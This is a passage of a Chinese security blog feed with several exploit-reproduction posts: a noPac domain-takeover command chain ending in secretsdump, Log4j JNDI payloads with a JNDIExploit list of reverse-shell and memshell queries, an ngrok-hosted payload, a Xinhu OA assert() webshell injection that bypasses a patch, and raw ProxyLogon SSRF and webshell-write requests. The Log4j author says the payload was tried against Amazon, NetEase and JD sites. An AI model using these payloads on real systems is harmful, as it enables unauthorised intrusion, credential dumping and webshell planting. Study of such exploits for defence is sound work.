addcomputer.py -computer-name fakename -computer-pass &#39;Passw0rd!&#39; -dc-ip 192.168.93.136 -dc-host WIN-5CHMN9C4UES.yayi.local yayi.local/jk:&#39;Hxc123456&#39;python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;fakename$&#39; -new-name WIN-5CHMN9C4UESpython3 getTGT.py yayi.local/WIN-5CHMN9C4UES:&#39;Passw0rd!&#39; -dc-ip 192.168.93.136python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;WIN-5CHMN9C4UES&#39; -new-name fakename$python3 getST.py -spn cifs/WIN-5CHMN9C4UES.yayi.local -impersonate admin -dc-ip 192.168.93.136 yayi.local/fakename$:passw0rd!python3 secretsdump.py -k -no-pass WIN-5CHMN9C4UES.yayi.local -just-dc</code></pre><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>解决此问题的最佳方法是安装 Microsoft 补丁 ( KB5008602 )，此补丁修复了 PAC 混淆的问题，并修复了由早期 KB5008380 补丁创建的 S4U2self 的此问题。<br>将机器帐户配额设置为0是阻止低权限用户创建机器帐户的快速而简单的解决方法，另一个相关的解决方法是从SeMachineAccountPrivilege 中删除Authenticated Users并添加域管理员或另一组允许的帐户。<br>由各种步骤引起的多个事件对于确定执行此攻击的尝试非常有用。确定这些事件的功劳完全归功于Andrew Schwartz，我只是在执行攻击后将我的日志发送给他。</p><p><img src="https://static.aichat.net/chat/202112/59927b79-aa84-4ff0-8b3f-47ea959f0acd.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>log4j漏洞复现</title>
      <link href="/posts/98d13101.html"/>
      <url>/posts/98d13101.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞。</p><p>经分析，log4j2是全球使用广泛的java日志框架，同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p><p><strong>影响版本:Apache Log4j 2.x &lt;= 2.14.1</strong><br><img src="https://static.aichat.net/chat/202112/4a24af97-d778-4b04-a26c-6021a07e000e.png" alt=""></p><p>漏洞利用条件：</p><pre><code>core和api同时调用才可以利用成功，对于lombok这种方式却不行</code></pre><p>jdk版本限制<br><img src="https://static.aichat.net/chat/202112/7f779424-3bf0-4c58-9413-a14ea4ef06e8.png" alt=""></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>181和之前的利用  是ldap-&gt;发送重定向到class-&gt;远程加载class执行</p><p>限制:<br>限制了远程加载class,被限制的版本只能接受ldap的结果,不接受加载远程class</p><p>高版本的绕过：<br>绕过是ldap直接发送调用本地el库执行，不再发送重定向class，不加载远程类，ldap查询还是会发</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>POC</p><pre><code>${jndi:ldap://x.4j2a.dnslog.cn/exp} #有登录框就插，判断是否有回显 （有代表可能可以利用）</code></pre><p>当天晚上测试的 （亚马逊，网易云，京东，icound等等）<br><img src="https://static.aichat.net/chat/202112/ef86937d-6b9d-4300-b62f-2f4eafa80090.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e8b79e36-ebd7-4485-b4a2-c0ca4ac72fec.png" alt=""></p><p>本地测试环境:JDK_1.8.0_181和JDK_1.8.0_191 | 对应：8u181、8u191<br>Main.java</p><pre><code class="java">package com.company;import java.io.*;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Main {    public static final Logger logger = LogManager.getLogger(Main.class);    public static void main(String[] args) {        System.out.println(&quot;Start&quot;);        logger.error(&quot;${lower:${jndi:rmi://127.0.0.1:1099/wlzyww}}&quot;);    }}</code></pre><p>8u191 ldap可以请求出去，但是无法加载利用<br><img src="https://static.aichat.net/chat/202112/b0e3516e-2431-4652-9bac-693d0f37d3a5.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/462f6476-bb7b-4791-b9e0-777b681a8767.png" alt=""></p><p>调用栈跟踪：（大哥跟的）<br><img src="https://static.aichat.net/chat/202112/ac71e84a-232b-4af6-b228-f6a2e6af3397.png" alt=""></p><p>致远|用友A8利用log4j getshell<br>JNDIExploit-1.2-SNAPSHOT.jar:<a href="https://github.com/0x727/JNDIExploit" target="_blank" rel="noopener">https://github.com/0x727/JNDIExploit</a></p><pre><code>Supported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell    ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp</code></pre><p>VPS/本地+ngrok<br><img src="https://static.aichat.net/chat/202112/3535500d-616d-4383-a347-de618310fe6e.png" alt=""></p><p>登录框插</p><pre><code>${jndi:ldap://4.tcp.ngrok.io:14296/Basic/TomcatMemshell2}</code></pre><p><img src="https://static.aichat.net/chat/202112/6deb3459-2646-40ed-a98a-3af3f92410c4.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/6d7d8566-f28f-4d38-879e-989199721561.png" alt=""></p><p>现存在问题:有些不行但是ldap能请求出来(一般是版本不行,不会bypass)</p><p>上线shellcode<br>将java执行shellcode编译为class，配合marshalsec即可<br><img src="https://static.aichat.net/chat/202112/63710e6a-a42e-494d-a297-b01aa2b25345.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a><br><a href="https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/l7iclJRegADs3oiEdcgAvQ</a><br><a href="https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/15zcLEk6_x2enszhim9afA</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>某DCS zip Slip任意写文件漏洞</title>
      <link href="/posts/d1787975.html"/>
      <url>/posts/d1787975.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hw的时候遇到的，结束后复现找了一下漏洞代码<br><img src="https://i.bmp.ovh/imgs/2021/12/1ec77b267b96fd4d.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞url:</p><pre><code>/dcs.web/upload?convertType=19&amp;isSourceDir=0</code></pre><p>文档说明<br><img src="https://s4.ax1x.com/2021/12/05/oBnmE8.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnu4g.png" alt=""></p><p>upload处理点<br><img src="https://s4.ax1x.com/2021/12/05/oBnQ3j.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn1vn.png" alt=""></p><p>config.inputDir.getPath()获取config.properties里的dir.input，然后设置了三个属性值:</p><pre><code>* fname - 文件名* finput - 文件上传后的路径* sourceRelativepath - 生成的UUID</code></pre><p><img src="https://s4.ax1x.com/2021/12/05/oBnw8J.png" alt=""></p><p>文件写入到input目录后，返回json请求/convert进行处理<br>首先调用buildParam函数进行处理<br><img src="https://s4.ax1x.com/2021/12/05/oBnyb6.png" alt=""></p><p>获取convertType参数，然后转换成int类型。传入EnumConvertType.getEnum判断值是否存在hash表里<br><img src="https://s4.ax1x.com/2021/12/05/oBncVK.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBn25D.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnh2d.png" alt=""></p><p>经过获取一些请求参数后，然后来到 String lowrealInput = realInput.toLowerCase()<br><img src="https://s4.ax1x.com/2021/12/05/oBn4xA.png" alt=""></p><p>往上跟踪发现取finput属性，获取inputDir，outputDir，zipFileName，zipOutput请求参数。然后进行判断，由于请求都没有带到这些参数所以去到finput<br><img src="https://s4.ax1x.com/2021/12/05/oBnort.png" alt=""></p><p>然后进入大判断，判断lowrealInput尾部是否存在对应的后缀，并将EnumConvertType设置为对应的hash表key<br><img src="https://s4.ax1x.com/2021/12/05/oBnHVf.png" alt=""></p><p>然后去到284行，获取fname，fileName属性的值。判断fileName不为空调用setFIleName函数。设置this.fileName,然后获取compressedSuffix请求参数，最后判断enumType不为空调用updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnqIS.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBnXGQ.png" alt=""></p><p>updateFilePath函数<br><img src="https://s4.ax1x.com/2021/12/05/oBnj2j.png" alt=""></p><p>后面就是对一些请求参数转int进行设置<br><img src="https://s4.ax1x.com/2021/12/05/oBnvxs.png" alt=""></p><p>回到ConvertParamBuilder.class，经过checkParam函数判断是不是pdf，然后单独开个线程处理然后生成json调用getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuiIU.png" alt=""></p><p>getJsonResult函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuAG4.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBuVz9.png" alt=""></p><p>getResultDate函数生成返回的url<br><img src="https://s4.ax1x.com/2021/12/05/oBueMR.png" alt=""></p><p>ZipService.zipfile函数，先获取tmpDir目录然后调用copyDirectiory函数将input目录下上传的文件copy到out目录。最后调用zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBuKZ6.png" alt=""></p><p>zip函数如下<br><img src="https://s4.ax1x.com/2021/12/05/oBuQIO.png" alt=""></p><p>zip函数<br><img src="https://s4.ax1x.com/2021/12/05/oBu3Je.png" alt=""></p><p>引用一张图<br><img src="https://s4.ax1x.com/2021/12/05/oBuYQA.png" alt=""></p><p>参考链接:<a href="https://saucer-man.com/information_security/364.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/364.html</a></p><p><img src="https://s4.ax1x.com/2021/12/05/oButsI.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/12/05/oBucyn.png" alt=""></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>信呼OA V2.3.0 治标不治本的配置文件getshell重新利用</title>
      <link href="/posts/3541f020.html"/>
      <url>/posts/3541f020.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接：<a href="https://www.freebuf.com/articles/web/286380.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/286380.html</a><br>最近打点的时候遇见个信呼OA，用的上述的<code>后台配置文件getshell</code>方法成过getshell<br>原本打算复现一下的，后面一看版本最新的。。。<br>(后面重新看了一下，发现修复不严谨。在后台用户重命名处修改即可重新利用)<br><img src="https://z3.ax1x.com/2021/10/18/5a8IFH.png" alt=""></p><h2 id="代码跟踪"><a href="#代码跟踪" class="headerlink" title="代码跟踪"></a>代码跟踪</h2><p>在V2.2.8的时候报出一处update拼接管理员名的注入+配置文件插入管理员修改config文件的信息<br>之前的payload利用：</p><pre><code>http://127.0.0.1/index.php?a=changestyle&amp;m=geren&amp;d=system&amp;ajaxbool=true&amp;style=21,id=1,name=0x610A6576616C28245F504F53545B315D293B2F2Fhttp://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961a:函数名称m:类名称d:处理文件文件夹父路径名称</code></pre><p>路由分析<br><img src="https://z3.ax1x.com/2021/10/18/5aGa9A.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aGrB8.png" alt=""></p><p>以前的漏洞点分析:<br>gerenClassAction函数更新管理员信息的点<br><img src="https://z3.ax1x.com/2021/10/18/5aGghj.png" alt=""></p><p>在V2.3.0后，int强转只取第一个参数的值<br>（一开始没看仔细还以为那里做了过滤，后面更了post也没发现那里不对。最好才看见这个int）<br><img src="https://z3.ax1x.com/2021/10/18/5aGHN4.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ9ED.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJeDf.png" alt=""></p><p>但是saveCongAjax函数没任何变化<br><img src="https://z3.ax1x.com/2021/10/18/5aJlCj.png" alt=""></p><p>直接利用后台的用户改名功能重命名管理员的名称，在rockClass.php新建了函数过滤，eval被砍了。直接用assert代替即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJUVU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aJ0PJ.png" alt=""></p><h2 id="死灰复燃"><a href="#死灰复燃" class="headerlink" title="死灰复燃"></a>死灰复燃</h2><p>用户管理处修改当前登录管理的姓名为:<code>\rassert($_POST[1]);//</code><br><img src="https://z3.ax1x.com/2021/10/18/5aJIxI.png" alt=""></p><p>访问<a href="http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961" target="_blank" rel="noopener">http://127.0.0.1/index.php?a=savecong&amp;m=cog&amp;d=system&amp;ajaxbool=true&amp;rnd=705961</a> 即可<br><img src="https://z3.ax1x.com/2021/10/18/5aJOIg.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/10/18/5aYiZT.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Exchange (CVE-2021-26855和CVE-2021-27065)复现</title>
      <link href="/posts/a0e15799.html"/>
      <url>/posts/a0e15799.html</url>
      <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre><code>* DC一台* Exchange一台</code></pre><p>前置介绍:<br>Exchange Server CU18 V15</p><pre><code>* CU18是更新的次数 - (*Exchange更新不以补丁方式更新，直接更新整个框架*)* V15 - Exchange的版本号</code></pre><p>Exchange下载链接:<a href="https://www.microsoft.com/en-us/download/details.aspx?id=102114" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=102114</a><br>注意:</p><pre><code>windows server 2012 - 可安装:Exchange 2013、Exchange 2016 -&gt;安装Exchange还需要多打个补丁推荐2016windows server 2016 - 可安装:Exchange 2016windows server 2019 - 可安装:Exchange 2016、Exchange 2019 -&gt;建议安装2019建议对照OS版本和Exchange版本安装，否则会出现一些奇怪的问题ExchangeExchange Server系统要求:https://docs.microsoft.com/en-us/exchange/plan-and-deploy/system-requirements?preserve-view=true&amp;view=exchserver-2016#supported-operating-systems-for-exchange-2016Exchange共存和兼容方案:https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/system-requirements?view=exchserver-2019-----------------------------------------------------------------------虚拟机内存至少4G虚拟机硬盘大小最小90G，安装Exchange需要80G-----------------------------------------------------------------------1. 以管理员身份运行Windows Powershell，安装必需的 Windows组件：Install-WindowsFeature NET-Framework-45-Features, Server-Media-Foundation, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS2. 安装.NET Framework 4.7.2或更高版本（微软官网）3. 安装Visual C++ Redistributable Package for Visual Studio 2012   https://www.microsoft.com/en-US/download/details.aspx?id=306794. 安装Visual C++ Redistributable Package for Visual Studio 2013   https://www.microsoft.com/en-us/download/details.aspx?id=407845. 安装Microsoft统一通信托管API 4.0 核心运行时（64 位）https://www.microsoft.com/en-US/download/details.aspx?id=349926. Exchange Server加域7. 安装Exchange Server 20168.   DC新建一个用户，用户所在组(Domain Admins/Enterprise Admins/Schema Admins)9.   等待安装（安装过程中不要重启，否则会出现问题，例如:Exchange安装包损坏，域环境出问题，安装到一半无法继续安装）</code></pre><p><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a> - Exchange Server 2016 本地部署安装流程<br><a href="https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/install-mailbox-role?view=exchserver-2019</a> - 安装过程</p><p>安装时间大概需要30~40分钟（如果准备没问题可直接进行安装，如果出现报错根据给出的问题解决）</p><p>个人安装的环境如下</p><pre><code>Exchange Server |OS:Windows Server 2016|version:CU18、V15DC|domain:YAYI.local|OS:Windows Server 2012</code></pre><p>安装完成访问后如下<br><img src="https://z3.ax1x.com/2021/09/23/4wNvtI.png" alt=""></p><p>安装完后需要配置的：</p><pre><code>1. 允许以&lt;username&gt;@&lt;domain&gt;方式登录2. 配置外部URL访问</code></pre><p>允许以<username>@<domain>方式登录<br><img src="https://z3.ax1x.com/2021/09/23/4wUp1f.png" alt=""></domain></username></p><p>配置外部URL访问<br>（ecp和owa都要改）<br><img src="https://z3.ax1x.com/2021/09/23/4wai26.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4wUn3V.png" alt=""></p><p>新建用户<br>Exchange安装完后只有当前机器加入的域用户，在Exchange新建用户===域新建普通用户<br>添加用户有两种方法：</p><pre><code>* 新建用户* 从现有的域用户添加用户（现有域用户所在的组有什么权限，添加后的用户就有什么权限）</code></pre><p><img src="https://z3.ax1x.com/2021/09/23/4waMGt.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4waQRP.png" alt=""></p><p>邮件发送测试<br><img src="https://z3.ax1x.com/2021/09/23/4wataj.png" alt=""></p><h2 id="CVE-2021–26855-SSRF漏洞复现"><a href="#CVE-2021–26855-SSRF漏洞复现" class="headerlink" title="CVE-2021–26855 - SSRF漏洞复现"></a>CVE-2021–26855 - SSRF漏洞复现</h2><pre><code>POST /ecp/1.ttf HTTP/1.1Host: 100.100.5.137Connection: closeUpgrade-Insecure-Requests: 1DNT: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-Dest: iframeReferer: https://100.100.5.137/ecp/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ug;q=0.8Content-Type: text/xmlCookie: X-BEResource=WIN-KCL6ANQQ2CH.yayi.local/autodiscover/autodiscover.xml?a=#~1;Content-Length: 338&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;pentest@yayi.local&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;</code></pre><p>返回对应邮箱用户的信息<br><img src="https://z3.ax1x.com/2021/09/23/4wacdJ.png" alt=""></p><p>漏洞触发过程:<br>OnPostAuthorizeRequest函数,该函数用于对post请求的安全检查,函数中继续调用了该类的OnPostAuthorizeInternal函数<br>OnPostAuthorizeInternal函数中调用SelectHandlerForUnauthenticatedRequest<br><img src="https://z3.ax1x.com/2021/09/23/4wdSOS.png" alt=""></p><p>SelectHandlerForUnauthenticatedRequest函数处理对应的请求路径<br><img src="https://z3.ax1x.com/2021/09/23/4wdAWq.png" alt=""></p><p>最后去到BEResourceRequestHandler.CanHandle(httpContext.Request)<br><img src="https://z3.ax1x.com/2021/09/23/4wdUmD.png" alt=""></p><p>CanHandle如果要返回真,则需要同时让GetBEResouceCookie和IsResourceRequest函数同时返回值为真。跟进这两个函数。<br><img src="https://z3.ax1x.com/2021/09/23/4wwCjK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwFBD.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwugP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwlDS.png" alt=""></p><p>经过返回调用去到ResolveAnchorMailbox函数<br><img src="https://z3.ax1x.com/2021/09/23/4wwsUJ.png" alt=""></p><p>获取cookie X-BEResource的值，走到FromString，试用~进行分割<br><img src="https://z3.ax1x.com/2021/09/23/4wwy59.png" alt=""></p><p>在ProxyRequestHandler.BeginProxyRequest函数中调用的的GetTargetBackEndServerUrl函数进行调用<br><img src="https://z3.ax1x.com/2021/09/23/4wwRv6.png" alt=""></p><p>继续看ProxyRequestHandler.BeginProxyRequest后面,ProxyRequestHandler.CreateServerRequest将吧uri发送给后端服务器<br><img src="https://z3.ax1x.com/2021/09/23/4ww4bD.png" alt=""></p><p>跟踪ProxyRequestHandler.CreateServerRequest,函数中PrepareServerRequest将进行uri代理请求的身份认证判断，通过最后一个else绕过认证,达到一个SSRF漏洞攻击的过程<br><img src="https://z3.ax1x.com/2021/09/23/4wwT5d.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/23/4wwXKf.png" alt=""></p><h2 id="CVE-2021–27065任意文件写入"><a href="#CVE-2021–27065任意文件写入" class="headerlink" title="CVE-2021–27065任意文件写入"></a>CVE-2021–27065任意文件写入</h2><p>编辑OAB配置，在外部链接中写⼊shell并保存<br><img src="https://z3.ax1x.com/2021/09/23/4w0CPs.png" alt=""></p><p>重置虚拟目录处写对应的UNC路径，点击重置<br><img src="https://z3.ax1x.com/2021/09/23/4w0eZF.png" alt=""></p><p>在Exchange Server机器上即可找到写入的shell<br><img src="https://z3.ax1x.com/2021/09/23/4w0NIH.png" alt=""></p><p>现成工具<br>SSRF+绕过登录+任意文件写入===RCE<br><img src="https://z3.ax1x.com/2021/09/23/4w0DQP.png" alt=""></p><p>先通过SSRF获取目标机器的信息<br><img src="https://z3.ax1x.com/2021/09/23/4w0hzq.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/23/4w07eU.png" alt=""></p><p>然后构造请求cookie：X-BEResource=&lt;上一步获取到Exchange Server HostName&gt;/autodiscover/autodiscover.xml?a=~1;<br><img src="https://z3.ax1x.com/2021/09/23/4wBAfA.png" alt=""></p><p>获取legacYDN<br><img src="https://www.mpimg.cn/images/2021/09/23/Image.png" alt=""></p><p>然后请求得到SID<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagec39d926bdc3e3d63.png" alt=""></p><p>构造JSON请求获取登录cookie<br><img src="https://www.mpimg.cn/images/2021/09/23/Image1dfa6cfa6c16e4ad.png" alt=""></p><p>请求获取ECP的RawIdentity<br><img src="https://www.mpimg.cn/images/2021/09/23/Image68352f9b96279cd9.png" alt=""></p><p>shell写入<br><img src="https://www.mpimg.cn/images/2021/09/23/Imagef068ad3d2a095634.png" alt=""></p><p>路径写入并重置</p><pre><code>POST /ecp/iikj.js HTTP/1.1Host: 192.168.93.135User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: X-BEResource=Administrator@WIN-KCL6ANQQ2CH.YAYI.local:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&amp;msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.&amp;a=~1942062522; ASP.NET_SessionId=7e41e4fe-6c9c-4830-a3df-ed346a6ba284; msExchEcpCanary=MbAJ26WCAk6Yisdw_SmpymgBqW31f9kIoxPEixgESnzNd6nbtbC0_wBn68G5lmxxKrl586QkRNA.msExchLogonMailbox: S-1-5-20Content-Type: application/json; charset=utf-8Content-Length: 393{&quot;identity&quot;: {&quot;__type&quot;: &quot;Identity:ECP&quot;, &quot;DisplayName&quot;: &quot;OAB (Default Web Site)&quot;, &quot;RawIdentity&quot;: &quot;977787fb-ece0-454e-9363-2cd8579ca39e&quot;}, &quot;properties&quot;: {&quot;Parameters&quot;: {&quot;__type&quot;: &quot;JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel&quot;, &quot;FilePathName&quot;: &quot;\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\c1gfR60IjXo3CBSLuwtW.aspx&quot;}}}</code></pre><p><img src="https://www.mpimg.cn/images/2021/09/23/Image55f36ab04c398cb9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/-zhong/p/14533053.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/14533053.html</a><br><a href="https://forum.butian.net/share/539" target="_blank" rel="noopener">https://forum.butian.net/share/539</a><br><a href="https://www.cnblogs.com/shenhaiyu111/p/12221101.html" target="_blank" rel="noopener">https://www.cnblogs.com/shenhaiyu111/p/12221101.html</a><br><a href="https://jishuin.proginn.com/p/763bfbd5ac72" target="_blank" rel="noopener">https://jishuin.proginn.com/p/763bfbd5ac72</a></p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2021-40444漏洞复现</title>
      <link href="/posts/3e27999a.html"/>
      <url>/posts/3e27999a.html</url>
